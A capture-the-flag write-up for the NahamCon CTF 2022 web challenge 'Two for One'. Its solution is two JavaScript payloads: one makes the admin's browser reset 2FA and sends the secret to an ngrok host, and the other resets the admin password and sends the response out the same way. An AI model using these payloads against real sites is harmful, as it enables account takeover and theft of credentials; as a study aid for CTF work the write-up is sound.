---
name: Two for One (2022)
event: NahamCon CTF 2022
category: Web
description: Writeup for Two for One (Web) - NahamCon CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Two for One

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/ttsFRYkL8wQ/0.jpg)](https://youtu.be/ttsFRYkL8wQ?t=1906 "NahamCon CTF 2022: Two for One")

## Description

> Need to keep things secure? Try out our safe, the most secure in the world!

## Solution

#### 2fa_exfil.js

{% code overflow="wrap" %}
```js
// Extract 2fa code from admin, can then generate QR code for GAuth (update the secret)
// https://www.google.com/chart?chs=200x200&chld=M%7C0&cht=qr&chl=otpauth://totp/Fort%20Knox:admin?secret=APJ5VXIQVMM5UF6X&issuer=Fort%20Knox
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://challenge.nahamcon.com:30666/reset2fa", true);
xhr.withCredentials = true;
xhr.onload = function () {
    var flag = btoa(xhr.responseText);
    var exfil = new XMLHttpRequest();
    exfil.open("GET", "http://b6a5-81-103-153-174.ngrok.io/?flag=" + flag);
    exfil.send();
};
xhr.send();
```
{% endcode %}

#### reset_pw.js

{% code overflow="wrap" %}
```js
// Reset admin password
var http = new XMLHttpRequest();
var url = "http://challenge.nahamcon.com:30666/reset_password";
var data = JSON.stringify({
    password: "admin",
    password2: "admin",
    otp: "661035",
});
http.open("POST", url, true);

// Not actually needed, just for debugging
http.onload = function () {
    var flag = btoa(http.responseText);
    var exfil = new XMLHttpRequest();
    exfil.open("GET", "http://b6a5-81-103-153-174.ngrok.io?flag=" + flag);
    exfil.send();
};

http.setRequestHeader("Content-type", "application/json");

http.send(data);
```
{% endcode %}
